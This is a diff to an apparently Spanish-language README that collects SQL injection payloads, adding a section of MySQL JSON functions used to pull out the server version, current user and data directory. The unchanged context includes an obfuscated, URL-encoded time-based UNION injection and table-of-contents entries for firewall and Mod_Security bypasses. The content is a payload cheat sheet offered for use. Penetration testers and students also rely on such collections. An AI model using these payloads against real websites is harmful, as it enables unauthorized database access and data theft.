@@ -57,6 +57,7 @@ La mayoria de los payloads aquí mostrados estan creados o modificados por mi.
         * [Sql inyection payload usando reverse](#Sql-inyection-payload-usando-reverse)
         * [Sql inyection payload usando extractvalue](#Sql-inyection-payload-usando-extractvalue)
         * [Sql inyection payload + url encode + timing](#Sql-inyection-payload-+-url-encode-+-timing)
+        * [SQL/JSON Generation Functions](#SQL/JSON-Generation-Functions)
     * [Sql inyection + dios sql](#Sql-inyection-+-dios-sql)
     * [Sql inyection Buffer Overflow / Firewall Crash bypass + xss inyection](#Sql-inyection-Buffer-Overflow-/-Firewall-Crash-bypass-+-xss-inyection)
     * [sql inyection payload+ bypass Mod_Security](#sql-inyection-payload+-bypass-Mod_Security)
@@ -940,6 +941,18 @@ SELECT * FROM (SELECT count(*), CONCAT((SELECT database()), 0x23, FLOOR(RAND(0)*
 ### Sql inyection payload + url encode + timing  
 
 `-7 %23%0AAND 0--%0A /*!12345UNION*/ /*!12345ALL*/ (/*!12345SELECT*/ 1,sleep(5),'soy vulnerable',BENCHMARK(1000000,MD5('true')),5,6,7,8,9,10,11,12,13)`
+
+### SQL/JSON Generation Functions
+```
+select JSON_OBJECT(1, @@version)
+
+select json_array(current_user())
+
+select json_objectagg(1, @@datadir)
+
+select json_arrayagg('_Y000!_')
+
+```
 
 
 
